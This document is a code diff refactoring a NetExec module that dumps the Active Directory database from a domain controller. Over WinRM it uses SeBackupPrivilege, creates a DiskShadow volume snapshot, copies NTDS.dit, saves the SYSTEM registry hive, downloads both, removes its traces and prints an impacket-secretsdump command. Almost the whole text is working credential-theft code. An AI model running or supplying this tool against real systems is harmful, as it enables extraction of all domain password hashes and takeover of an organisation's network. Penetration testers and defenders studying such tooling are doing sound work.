@@ -1,6 +1,6 @@
 """Dump NTDS.dit via a VSS snapshot created with DiskShadow.
 
-Requires SeBackupPrivilege (typically a Domain Controller).
+Requires SeBackupPrivilege, typically on a Domain Controller.
 """
 
 import contextlib
@@ -12,28 +12,26 @@ import tempfile
 
 from nxc.helpers.misc import CATEGORY, gen_random_string
 
-# Regex constants - all DiskShadow output formats validated on Server 2019/2022
-
-# DiskShadow verbose alias-binding line: "  -> %alias% = {GUID}"
-# Leading whitespace is intentional; alias comparison is case-insensitive.
+# DiskShadow prefixes the alias line with whitespace.
+# Alias matching is case-insensitive.
 _ALIAS_LINE_RE = re.compile(
     r"^\s*->\s+%(?P<alias>[^%]+)%\s+=\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}",
     re.IGNORECASE | re.MULTILINE,
 )
 
-# Alternative verbose line (some Windows versions): alias resolved as env var.
-# Confirmed on Blackfield lab, Server 2019; no leading "->"; "shadow ID" not "shadow copy".
+# Some Windows versions report the alias as an environment variable.
 _ALIAS_ENVVAR_RE = re.compile(
     r"^\s*Alias\s+(?P<alias>\S+)\s+for\s+shadow\s+ID\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}\s+set\s+as\s+environment\s+variable",
     re.IGNORECASE | re.MULTILINE,
 )
 
-# Exposure confirmation: trailing backslash-period required (DiskShadow can exit 0 without it).
+# DiskShadow may return success without actually exposing the snapshot.
+# Require the explicit exposure confirmation before continuing.
 _EXPOSE_CONFIRM_RE = re.compile(
     r"(?im)^[ \t]*the[ \t]+shadow[ \t]+copy[ \t]+was[ \t]+successfully[ \t]+exposed[ \t]+as[ \t]+([A-Za-z]):\\\.[ \t\r]*$"
 )
 
-# Cleanup transcript markers emitted by "delete shadows id {GUID}":
+# Confirm that the exact snapshot GUID was deleted.
 _CLEANUP_DELETING_RE = re.compile(
     r"deleting shadow copy \{([^}]+)\}\.\.\.", re.IGNORECASE
 )
@@ -42,17 +40,10 @@ _CLEANUP_COUNT_RE = re.compile(r"1 shadow cop(?:y|ies) deleted", re.IGNORECASE)
 _CRLF = "\r\n"
 
 
-# Module-level helpers - DiskShadow-specific, testable without a live target
-
-
 def parse_alias_guid(stdout: str, alias: str) -> str | None:
     """Return snapshot GUID bound to *alias* (uppercase), or ``None`` if absent.
 
-    Recognises two formats:
-      Format 1: ``  -> %alias% = {GUID}``
-      Format 2: ``Alias alias for shadow ID {GUID} set as environment variable.``
-
-    The same GUID in both formats counts as one match.
+    The same GUID appearing in both output formats counts as one match.
     Raises ``ValueError`` if more than one distinct GUID is bound to *alias*.
     """
     guids: set[str] = set()
@@ -70,7 +61,7 @@ def parse_alias_guid(stdout: str, alias: str) -> str | None:
 
 
 def build_create_script(alias: str, drive_letter: str, metadata_path: str) -> str:
-    """Return a CRLF-terminated DiskShadow create script for C:, exposed at *drive_letter*: with metadata at *metadata_path*."""
+    """Build the DiskShadow creation script."""
     lines = [
         "set verbose on",
         "set context persistent nowriters",
@@ -84,7 +75,7 @@ def build_create_script(alias: str, drive_letter: str, metadata_path: str) -> st
 
 
 def build_cleanup_script(drive_letter: str, shadow_guid: str) -> str:
-    """Return a CRLF-terminated DiskShadow script that unexposes *drive_letter*: and deletes the snapshot by exact GUID."""
+    """Build the cleanup script for an exposed snapshot."""
     lines = [
         "set verbose on",
         f"unexpose {drive_letter}:",
@@ -95,7 +86,7 @@ def build_cleanup_script(drive_letter: str, shadow_guid: str) -> str:
 
 
 def build_delete_only_script(shadow_guid: str) -> str:
-    """Return a CRLF-terminated DiskShadow script that deletes the snapshot by exact GUID (no unexpose)."""
+    """Build the cleanup script for an unexposed snapshot."""
     lines = [
         "set verbose on",
         f"delete shadows id {{{shadow_guid}}}",
@@ -104,33 +95,17 @@ def build_delete_only_script(shadow_guid: str) -> str:
     return _CRLF.join(lines) + _CRLF
 
 
-# NXCModule
-
-
 class NXCModule:
-    """Dump NTDS.dit via a VSS snapshot created with DiskShadow.
-
-    Requires SeBackupPrivilege; cleanup always runs in a finally block.
-    Snapshot deletion is always by exact GUID confirmed in DiskShadow output.
-    """
-
     name = "ntds_shadow"
     description = "Dump NTDS.dit via a VSS snapshot (DiskShadow)"
     supported_protocols = ["winrm"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        """No options."""
-
-    # Native-command adapter
+        """NO OPTIONS"""
 
     def _run_cmd(self, connection, cmd: str) -> tuple[str, str, int]:
-        """Execute a CMD command through PowerShell; return (stdout, stderr, rc).
-
-        Backup Operators lack CMD Invoke rights so cmd.exe is launched via
-        System.Diagnostics.Process; streams and exit code are captured as JSON.
-        Raises RuntimeError on PS transport failure or JSON parsing errors.
-        """
+        """Run a CMD command through PowerShell and return its output and exit code."""
         safe = cmd.replace("'", "''")
         ps = (
             "$p=[System.Diagnostics.Process]::new();"
@@ -145,16 +120,9 @@ class NXCModule:
             "$p.WaitForExit();"
             "[pscustomobject]@{O=$ot.Result;E=$et.Result;C=[int]$p.ExitCode}|ConvertTo-Json -Compress"
         )
-        try:
-            ps_stdout, streams, had_errors = connection.conn.execute_ps(ps)
-        except (TypeError, ValueError) as exc:
-            raise RuntimeError(
-                f"Unexpected execute_ps return shape for {cmd!r}: {exc}"
-            ) from exc
+        ps_stdout, streams, had_errors = connection.conn.execute_ps(ps)
         if had_errors:
-            error_msgs = ""
-            with contextlib.suppress(Exception):
-                error_msgs = "; ".join(str(e) for e in (streams.error or []))
+            error_msgs = "; ".join(str(e) for e in (streams.error or []))
             raise RuntimeError(
                 f"PowerShell adapter reported errors for {cmd!r}"
                 + (f": {error_msgs}" if error_msgs else "")
@@ -169,16 +137,12 @@ class NXCModule:
                 f"Failed to parse adapter response for {cmd!r}: {exc}"
             ) from exc
 
-    # Entry point
-
     def on_login(self, context, connection):
         log = context.log
 
-        # 1. Privilege check
         if not self._check_privilege(log, connection):
             return
 
-        # 2. Per-run identifiers
         run_id = gen_random_string(8).lower()
         alias = f"vss{run_id}"
         staging_dir = f"C:\\Windows\\Temp\\nxc_{run_id}"
@@ -187,184 +151,167 @@ class NXCModule:
         ntds_dst = f"{staging_dir}\\ntds.dit"
         system_dst = f"{staging_dir}\\SYSTEM"
 
-        # 3. Staging directory
         _, stderr, rc = self._run_cmd(connection, f"mkdir {staging_dir}")
         if rc != 0:
-            log.fail(f"Failed to create staging directory: {stderr.strip()}")
+            log.fail(f"Could not create staging directory: {stderr.strip()}")
             return
 
-        # 4. Drive letter
-        drive_letter = self._pick_drive(log, connection)
-        if not drive_letter:
-            with contextlib.suppress(Exception):
-                self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
-            return
-
-        # 5. Upload DiskShadow create script
-        if not self._upload(
-            log,
-            connection,
-            build_create_script(alias, drive_letter, metadata_path),
-            script_path,
-        ):
-            with contextlib.suppress(Exception):
-                self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
-            return
-
-        # 6. Run DiskShadow; capture rc so a non-zero exit is diagnosed.
-        log.display("Running DiskShadow to create VSS snapshot...")
-        stdout, stderr, ds_create_rc = self._run_cmd(
-            connection, f"diskshadow /s {script_path}"
-        )
-
-        # 7. Parse GUID regardless of rc so a partial run can be cleaned safely.
-        try:
-            shadow_guid = parse_alias_guid(stdout, alias)
-        except ValueError as exc:
-            log.fail(f"Can't determine snapshot GUID: {exc}")
-            self._cleanup(log, connection, None, drive_letter, False, staging_dir)
-            return
-
-        if ds_create_rc != 0:
-            log.fail(f"DiskShadow exited with code {ds_create_rc}; cleaning up")
-            for line in stdout.splitlines():
-                if line.strip():
-                    log.display(f"  [stdout] {line}")
-            for line in stderr.splitlines():
-                if line.strip():
-                    log.fail(f"  [stderr] {line}")
-            if shadow_guid is None:
-                log.fail(
-                    "No alias-bound GUID in DiskShadow output - a snapshot may remain; verify manually"
-                )
-            self._cleanup(
-                log, connection, shadow_guid, drive_letter, False, staging_dir
-            )
-            return
-
-        if not shadow_guid:
-            log.fail(
-                "DiskShadow did not report a snapshot GUID - snapshot may not have been created"
-            )
-            self._cleanup(log, connection, None, drive_letter, False, staging_dir)
-            return
-
-        log.success(f"Snapshot created: {{{shadow_guid}}}")
-
-        # Steps 8-12: the inner except logs acquisition errors before finally runs, so the
-        # message is never lost even if _cleanup itself raises.  The outer except silences
-        # whatever propagates (re-raised acquisition error or a cleanup exception that replaced
-        # it) so nothing escapes into NetExec.  _cleanup is called exactly once by finally.
-        expose_reported = False
+        shadow_guid = None
+        drive_letter = None
+        exposed = False
         ntds_ok = False
         system_ok = False
         local_ntds = local_system = ""
         try:
+            drive_letter = self._pick_drive(log, connection)
+            if not drive_letter:
+                return
+
+            if not self._upload(
+                log,
+                connection,
+                build_create_script(alias, drive_letter, metadata_path),
+                script_path,
+            ):
+                return
+
+            log.display("Creating DiskShadow snapshot...")
             try:
-                # 8. Verify exposure (rc=0 alone is insufficient; DiskShadow can exit clean without it).
-                expose_matches = _EXPOSE_CONFIRM_RE.findall(stdout)
-                if (
-                    len(expose_matches) != 1
-                    or expose_matches[0].upper() != drive_letter
-                ):
-                    log.fail(
-                        f"DiskShadow did not confirm exposure on {drive_letter}: ({len(expose_matches)} confirmation lines found)"
-                    )
-                    return
-
-                expose_reported = True
-                log.success(f"Snapshot exposed at {drive_letter}:")
-
-                # 9. Verify NTDS.dit is accessible through the exposed drive.
-                _, _, ntds_rc = self._run_cmd(
-                    connection, f'dir "{drive_letter}:\\Windows\\NTDS\\ntds.dit" /b'
+                stdout, stderr, ds_create_rc = self._run_cmd(
+                    connection, f"diskshadow /s {script_path}"
                 )
-                if ntds_rc != 0:
-                    log.fail(
-                        f"NTDS.dit not accessible at {drive_letter}:\\Windows\\NTDS\\ntds.dit"
-                    )
-                    return
-
-                # 10. Robocopy NTDS.dit (exit codes 0-7 are success variants)
-                log.display("Copying NTDS.dit from snapshot...")
-                _, _, rob_rc = self._run_cmd(
-                    connection,
-                    f"robocopy {drive_letter}:\\Windows\\NTDS {staging_dir} ntds.dit /b /r:2 /w:1 /j",
-                )
-                if rob_rc >= 8:
-                    log.fail(f"robocopy NTDS.dit failed (exit code {rob_rc})")
-                    return
-
-                # 11. Save SYSTEM registry hive
-                log.display("Saving SYSTEM registry hive...")
-                _, _, reg_rc = self._run_cmd(
-                    connection, f"reg save HKLM\\SYSTEM {system_dst} /y"
-                )
-                if reg_rc != 0:
-                    log.fail("reg save SYSTEM failed")
-                    return
-
-                # 12. Download with remote-vs-local size verification (fail-closed)
-                output_base = connection.output_file_template.format(
-                    output_folder="ntds"
-                )
-                os.makedirs(os.path.dirname(output_base), exist_ok=True)
-                local_ntds = f"{output_base}.ntds.dit"
-                local_system = f"{output_base}.SYSTEM"
-                ntds_ok = self._download(
-                    log, connection, ntds_dst, local_ntds, "NTDS.dit"
-                )
-                system_ok = self._download(
-                    log, connection, system_dst, local_system, "SYSTEM"
-                )
-
             except Exception as exc:
-                log.fail(f"Unexpected error during acquisition: {exc}")
-                raise
-
-            finally:
-                self._cleanup(
-                    log,
-                    connection,
-                    shadow_guid,
-                    drive_letter,
-                    expose_reported,
-                    staging_dir,
-                    ntds_path=ntds_dst,
-                    system_path=system_dst,
-                )
-
-            # 13. Print offline analysis command
-            if ntds_ok and system_ok:
-                log.highlight(
-                    f"Run: impacket-secretsdump -system {shlex.quote(local_system)} -ntds {shlex.quote(local_ntds)} LOCAL"
-                )
-            else:
                 log.fail(
-                    "One or more downloads failed - secretsdump command not printed"
+                    f"Could not run DiskShadow: {exc}. "
+                    "A snapshot may remain on the target"
+                )
+                return
+
+            # Parse the GUID even when DiskShadow returns an error. It may have created a snapshot before the error occurred.
+            try:
+                shadow_guid = parse_alias_guid(stdout, alias)
+            except ValueError as exc:
+                log.fail(
+                    f"DiskShadow returned multiple snapshot GUIDs: {exc}. "
+                    "A snapshot may remain on the target"
+                )
+                return
+
+            expose_matches = _EXPOSE_CONFIRM_RE.findall(stdout)
+            exposed = (
+                len(expose_matches) == 1 and expose_matches[0].upper() == drive_letter
+            )
+
+            if ds_create_rc != 0:
+                log.fail(f"DiskShadow returned exit code {ds_create_rc}")
+                for line in stdout.splitlines():
+                    if line.strip():
+                        log.display(f"  [stdout] {line}")
+                for line in stderr.splitlines():
+                    if line.strip():
+                        log.fail(f"  [stderr] {line}")
+                if shadow_guid is None:
+                    log.fail(
+                        "No snapshot GUID was found, so a snapshot may remain on the target"
+                    )
+                return
+
+            if not shadow_guid:
+                log.fail(
+                    "No snapshot GUID was found in the DiskShadow output, so a snapshot may remain on the target"
+                )
+                return
+
+            if not exposed:
+                log.fail(
+                    f"DiskShadow did not confirm that the snapshot was exposed on {drive_letter}:"
+                )
+                return
+
+            _, _, ntds_rc = self._run_cmd(
+                connection, f'dir "{drive_letter}:\\Windows\\NTDS\\ntds.dit" /b'
+            )
+            if ntds_rc != 0:
+                log.fail(
+                    f"Could not access NTDS.dit at {drive_letter}:\\Windows\\NTDS\\ntds.dit"
+                )
+                return
+            log.success("Snapshot created and NTDS accessible")
+
+            log.display("Acquiring NTDS database and SYSTEM hive...")
+            _, _, rob_rc = self._run_cmd(
+                connection,
+                f"robocopy {drive_letter}:\\Windows\\NTDS {staging_dir} ntds.dit /b /r:2 /w:1 /j",
+            )
+            # Robocopy considers exit codes 0 through 7 successful.
+            if rob_rc >= 8:
+                log.fail(
+                    f"Could not copy NTDS.dit from the snapshot (exit code {rob_rc})"
+                )
+                return
+
+            _, _, reg_rc = self._run_cmd(
+                connection, f"reg save HKLM\\SYSTEM {system_dst} /y"
+            )
+            if reg_rc != 0:
+                log.fail("Could not save the SYSTEM hive")
+                return
+
+            output_base = connection.output_file_template.format(output_folder="ntds")
+            os.makedirs(os.path.dirname(output_base), exist_ok=True)
+            local_ntds = f"{output_base}.ntds.dit"
+            local_system = f"{output_base}.SYSTEM"
+            ntds_ok = self._download(log, connection, ntds_dst, local_ntds, "NTDS.dit")
+            system_ok = self._download(
+                log, connection, system_dst, local_system, "SYSTEM"
+            )
+            if ntds_ok and system_ok:
+                log.success("NTDS database and SYSTEM hive downloaded")
+                log.display(
+                    f"NTDS.dit: {local_ntds} ({os.path.getsize(local_ntds)} bytes)"
+                )
+                log.display(
+                    f"SYSTEM.hive: {local_system} ({os.path.getsize(local_system)} bytes)"
                 )
 
-        except Exception:
-            pass
+        except Exception as exc:
+            log.fail(f"Could not acquire NTDS.dit and the SYSTEM hive: {exc}")
+            return
+        finally:
+            try:
+                self._cleanup(
+                    log, connection, shadow_guid, drive_letter, exposed, staging_dir
+                )
+            except Exception as exc:
+                log.fail(f"Cleanup failed: {exc}")
 
-    # Private helpers
+        if ntds_ok and system_ok:
+            log.highlight(
+                f"Run: impacket-secretsdump"
+                f" -system {shlex.quote(local_system)}"
+                f" -ntds {shlex.quote(local_ntds)} LOCAL"
+            )
+        else:
+            log.fail(
+                "One or more files could not be downloaded. "
+                "The secretsdump command was not printed."
+            )
 
     def _check_privilege(self, log, connection) -> bool:
-        """Return True if SeBackupPrivilege is Enabled for the current user."""
         try:
             stdout, _, _ = self._run_cmd(connection, "whoami /priv /fo csv /nh")
         except Exception as exc:
-            log.fail(f"Privilege check failed: {exc}")
+            log.fail(f"Could not check SeBackupPrivilege: {exc}")
             return False
         for line in stdout.splitlines():
             parts = [p.strip('"') for p in line.split('","')]
             if len(parts) >= 3 and parts[0].upper() == "SEBACKUPPRIVILEGE":
                 if parts[2].upper() == "ENABLED":
-                    log.success("SeBackupPrivilege is Enabled")
+                    log.success("SeBackupPrivilege confirmed")
                     return True
-                log.fail("SeBackupPrivilege is present but not Enabled")
+                log.fail("SeBackupPrivilege is present but disabled")
                 return False
-        log.fail("SeBackupPrivilege not found - aborting")
+        log.fail("SeBackupPrivilege was not found.. aborting..")
         return False
 
     def _pick_drive(self, log, connection) -> str | None:
@@ -384,11 +331,11 @@ class NXCModule:
             if f"{letter}:" not in occupied:
                 log.debug(f"Selected drive letter: {letter}:")
                 return letter
-        log.fail("No free drive letter available (Z-D all occupied)")
+        log.fail("No free drive letter available between D: and Z:")
         return None
 
     def _upload(self, log, connection, content: str, remote_path: str) -> bool:
-        """Write *content* to a local temp file and upload to *remote_path*; return True on success."""
+        """Upload a generated script and remove the local temporary file."""
         local_path = None
         try:
             with tempfile.NamedTemporaryFile(
@@ -399,7 +346,7 @@ class NXCModule:
             connection.conn.copy(local_path, remote_path)
             return True
         except Exception as exc:
-            log.fail(f"Failed to upload script to {remote_path}: {exc}")
+            log.fail(f"Could not upload script to {remote_path}: {exc}")
             return False
         finally:
             if local_path:
@@ -409,7 +356,7 @@ class NXCModule:
     def _download(
         self, log, connection, remote_path: str, local_path: str, label: str
     ) -> bool:
-        """Fetch *remote_path* to *local_path*, verifying byte count; return False on any failure."""
+        """Download a file and verify its size."""
         ps_out = connection.execute(
             f"(Get-Item '{remote_path}').Length", True, shell_type="powershell"
         )
@@ -418,13 +365,13 @@ class NXCModule:
         except ValueError:
             remote_size = 0
         if remote_size <= 0:
-            log.fail(f"{label}: remote size unavailable or zero (got {ps_out!r})")
+            log.fail(f"Could not determine the remote size of {label} (got {ps_out!r})")
             return False
 
         try:
             connection.conn.fetch(remote_path, local_path)
         except Exception as exc:
-            log.fail(f"Failed to download {label}: {exc}")
+            log.fail(f"Could not download {label}: {exc}")
             with contextlib.suppress(FileNotFoundError, OSError):
                 os.unlink(local_path)
             return False
@@ -432,13 +379,12 @@ class NXCModule:
         local_size = os.path.getsize(local_path) if os.path.exists(local_path) else -1
         if local_size != remote_size:
             log.fail(
-                f"{label} size mismatch: remote={remote_size} B, local={local_size} B"
+                f"Downloaded {label}, but the file size does not match: remote={remote_size} B, local={local_size} B"
             )
             with contextlib.suppress(FileNotFoundError, OSError):
                 os.unlink(local_path)
             return False
 
-        log.success(f"Downloaded {label} ({local_size} B) -> {local_path}")
         return True
 
     def _cleanup(
@@ -446,29 +392,16 @@ class NXCModule:
         log,
         connection,
         shadow_guid: str | None,
-        drive_letter: str,
-        expose_reported: bool,
+        drive_letter: str | None,
+        exposed: bool,
         staging_dir: str,
-        *,
-        ntds_path: str | None = None,
-        system_path: str | None = None,
     ) -> None:
-        """Remove all remote artifacts owned by this run.
-
-        Each step runs independently. Snapshot deletion is GUID-gated:
-        ``shadow_guid=None`` removes only the staging dir (no DiskShadow call).
-        ``shadow_guid=str`` issues exact ``delete shadows id {GUID}``.
-        """
-        # Best-effort: delete individual acquired files first
-        for artifact in [a for a in (ntds_path, system_path) if a]:
-            with contextlib.suppress(Exception):
-                self._run_cmd(connection, f"del /f /q {artifact}")
-
-        # Snapshot deletion - requires a verified GUID
+        """Remove the snapshot and staging files created by this run."""
+        cleanup_ok = False
         if shadow_guid:
             script = (
                 build_cleanup_script(drive_letter, shadow_guid)
-                if expose_reported
+                if exposed
                 else build_delete_only_script(shadow_guid)
             )
             cleanup_path = f"{staging_dir}\\cleanup.dsh"
@@ -480,21 +413,33 @@ class NXCModule:
                     m = _CLEANUP_DELETING_RE.search(ds_stdout)
                     guid_confirmed = m and m.group(1).upper() == shadow_guid.upper()
                     count_confirmed = _CLEANUP_COUNT_RE.search(ds_stdout)
+
                     if ds_rc == 0 and guid_confirmed and count_confirmed:
-                        log.debug("Snapshot deleted successfully")
+                        cleanup_ok = True
                     else:
                         log.fail(
-                            f"Snapshot {{{shadow_guid}}} may remain on the target; verify: delete shadows id {{{shadow_guid}}}"
+                            f"Could not remove snapshot {{{shadow_guid}}}. "
+                            f"Snapshot {{{shadow_guid}}} may remain on the target"
                         )
                 except Exception as exc:
                     log.fail(
-                        f"Snapshot {{{shadow_guid}}} may remain on the target; DiskShadow cleanup raised: {exc}"
+                        f"Could not remove snapshot {{{shadow_guid}}}: {exc}. "
+                        f"Snapshot {{{shadow_guid}}} may remain on the target"
                     )
+            else:
+                log.fail(
+                    f"Could not upload the cleanup script. "
+                    f"Snapshot {{{shadow_guid}}} may remain on the target"
+                )
 
-        # Best-effort: remove staging directory last; log the path on non-zero rc or exception.
+        # Remove the staging directory and any files created during the run.
         try:
             _, _, rm_rc = self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
             if rm_rc != 0:
-                log.fail(f"Staging directory may remain on target: {staging_dir}")
+                log.fail(f"Could not remove staging directory: {staging_dir}")
+                cleanup_ok = False
         except Exception as exc:
-            log.fail(f"Staging directory may remain on target: {staging_dir} ({exc})")
+            log.fail(f"Could not remove staging directory {staging_dir}: {exc}")
+            cleanup_ok = False
+        if cleanup_ok:
+            log.success("Remote artifacts and shadow copy removed")
